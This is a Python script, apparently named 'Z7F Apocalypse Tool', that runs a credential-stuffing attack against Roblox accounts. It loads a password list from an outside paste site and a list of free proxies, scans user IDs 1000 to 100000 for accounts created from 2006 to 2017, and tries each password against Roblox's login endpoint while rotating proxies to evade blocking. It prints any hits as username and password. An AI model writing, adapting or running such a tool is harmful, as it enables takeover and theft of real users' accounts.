import requests
import threading
from concurrent.futures import ThreadPoolExecutor
import random

# --- Z7F Apocalypse Tool ---
PASS_URL = "https://codeshare-qdcqms4b.manus.space/raw/6LFTQ23W"
PROXY_URL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"

class Z7F_Apocalypse:
    def __init__(self):
        self.passwords = self._load_data(PASS_URL, "Passwords")
        self.proxies = self._load_data(PROXY_URL, "Proxies")
        self.headers = {
            "User-Agent": "Roblox/WinInet",
            "Content-Type": "application/json",
            "Accept": "application/json"
        }

    def _load_data(self, url, name):
        try:
            r = requests.get(url, timeout=10)
            data = [line.strip() for line in r.text.splitlines() if line.strip()]
            print(f"[+] Loaded {len(data)} {name}")
            return data
        except:
            return []

    def get_proxy(self):
        if not self.proxies: return None
        p = random.choice(self.proxies)
        return {"http": f"http://{p}", "https": f"http://{p}"}

    def check_account(self, user_id):
        proxy = self.get_proxy()
        session = requests.Session()
        
        try:
            # جلب معلومات الحساب
            user_req = session.get(f"https://users.roblox.com/v1/users/{user_id}", proxies=proxy, timeout=5).json()
            username = user_req.get("name")
            if not username: return
            
            year = int(user_req.get("created", "2099").split("-")[0])
            
            # الفحص للنطاق المطلوب 2006-2017
            if 2006 <= year <= 2017:
                for pwd in self.passwords:
                    # جلب التوكن لفك التبند وتمرير الطلب
                    token_req = session.post("https://auth.roblox.com/v2/login", proxies=proxy, timeout=5)
                    token = token_req.headers.get("x-csrf-token")
                    
                    self.headers["x-csrf-token"] = token
                    payload = {"username": username, "password": pwd}
                    
                    login = session.post("https://auth.roblox.com/v2/login", json=payload, headers=self.headers, proxies=proxy, timeout=5).json()
                    
                    if "user" in login:
                        self._print_hit(username, pwd, year, user_id, user_req.get("displayName"))
                        break
        except:
            pass

    def _print_hit(self, user, pwd, year, uid, display):
        print(f"\n\033[92m[HIT] {user} | {pwd} | Year: {year} | ID: {uid} | Name: {display}\033[0m")

    def start(self, start_id, end_id):
        print(f"[*] Starting Scan on Range: {start_id} - {end_id}")
        with ThreadPoolExecutor(max_workers=30) as executor:
            executor.map(self.check_account, range(start_id, end_id))

if __name__ == "__main__":
    app = Z7F_Apocalypse()
    if app.passwords:
        # يمكنك تغيير نطاق الـ ID هنا
        app.start(1000, 100000)
